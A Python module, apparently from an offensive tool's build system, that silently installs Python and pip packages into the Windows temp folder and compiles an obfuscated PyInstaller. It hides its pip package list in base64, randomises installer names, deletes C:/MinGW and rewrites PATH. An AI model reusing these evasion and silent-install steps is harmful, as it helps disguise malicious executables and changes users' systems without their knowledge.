import shutil
import subprocess
import os
import random
import base64
from Utils.helpers import is_os_64bit,run_pwsh,is_msvc_exist,download_file,extract_zip
import requests
from zipfile import ZipFile
from .pyinstaller_obfuscate.obfuscationModule.main import Obfuscate
from .pyinstaller_obfuscate.main import obfuscate_files



def download_pyinstaller(download_path):
    URL = "https://github.com/pyinstaller/pyinstaller/archive/refs/tags/v4.7.zip"
    clean_path = download_path.replace('.zip','')
    if os.path.exists(download_path):
        os.remove(download_path)
    if os.path.exists(clean_path):
        shutil.rmtree(clean_path)
    if download_file(clean_path,URL):
        if extract_zip(f"c:/users/{os.getlogin()}/appdata/local/temp",clean_path):
            return f"c:/users/{os.getlogin()}/appdata/local/temp/pyinstaller-4.7"
    return False




def get_pyinstaller(pythonPath,admin=True):
    PATH = f"c:/users/{os.getlogin()}/appdata/local/temp/pyinstaller-4.7.zip"
    if not download_pyinstaller(PATH):
        # assume pyinstaller extracted in the PATH
        print("[*] Unknown error in extracting and downloading pyinstaller")
    if admin:
        if is_msvc_exist():
            if Obfuscate(base_dir=f"c:/users/{os.getlogin()}/appdata/local/temp/",python_path=pythonPath).obfuscate():
                pass
        else:
            gcc = "https://github.com/brechtsanders/winlibs_mingw/releases/download/11.2.0-9.0.0-msvcrt-r6/winlibs-x86_64-posix-seh-gcc-11.2.0-mingw-w64-9.0.0-r6.zip"
            PATH = f"c:/users/{os.getlogin()}/appdata/local/temp/gcc.zip"
            GCC_EXTRACTION_PATH = "c:/MinGW"
            if os.path.exists(PATH):
               os.remove(PATH)
            if os.path.exists(GCC_EXTRACTION_PATH):
                shutil.rmtree(GCC_EXTRACTION_PATH)
            if download_file(path=PATH,URL=gcc):
                extract_zip(extracion_path=GCC_EXTRACTION_PATH,file_to_extract=PATH)
            os.system(r'setx PATH "C:\MinGW\mingw64\bin;%PATH%"')
            if Obfuscate(base_dir=f"c:/users/{os.getlogin()}/appdata/local/temp/",python_path=pythonPath).obfuscate():
                obfuscate_files(extraction_path=f"c:/users/{os.getlogin()}/appdata/local/temp/",name="test",base_path=f"c:/users/{os.getlogin()}/appdata/local/temp/try_this",pythonPath=pythonPath)
            #get gcc?
            pass
    #no admin
    if is_msvc_exist():
        #assume your are not admin, but pyinstaller exist and you have msvc
        #TODO:// detect other C COMPILERS
        return

    pass
def pip_install(new_path=None):
    # base64 encode&decode all commands here on runtime, to prevent obfuscation from obfuscating the packages to install
    to_install = "Y3J5cHRvZ3JhcGh5IHRpbnlhZXMgbmV0aWZhY2VzIHJlcXVlc3RzIHBzdXRpbCBwYXRobGliMiB3aGVlbA=="
    if new_path:
        subprocess.run(
            f"{new_path} -m pip install --upgrade pip")
        subprocess.run(
            f"{new_path} -m pip install {base64.b64decode(to_install.encode()).decode()}")
        return 1
    subprocess.run(
        f"c:/users/{os.getlogin()}/appdata/local/programs/python/python38/python.exe -m pip install --upgrade pip")
    subprocess.run(
        f"c:/users/{os.getlogin()}/appdata/local/programs/python/python38/python.exe -m pip install {base64.b64decode(to_install.encode()).decode()}")
    return 1


def install_python():
    os_p = 64
    if not is_os_64bit():
        os_p = 32
    rand_py = f'python{random.randrange(111, 9999999)}.exe'
    url = "https://www.python.org/ftp/python/3.8.1/python-3.8.1-amd64.exe" if os_p == 64 else "https://www.python.org/ftp/python/3.8.1/python-3.8.1.exe"
    d = run_pwsh(f"""iwr -Uri {url} -OutFile c:/users/$env:username/appdata/local/temp/{rand_py} """)
    if os.path.exists(f"c:/users/{os.getlogin()}/appdata/local/temp/{rand_py}"):
        subprocess.run(
            f"c:/users/{os.getlogin()}/appdata/local/temp/{rand_py} /quiet InstallAllUsers=0 Include_launcher=0 PrependPath=1 Include_test=0")
    os.remove(f"c:/users/{os.getlogin()}/appdata/local/temp/{rand_py}")
    pip_install()
    return True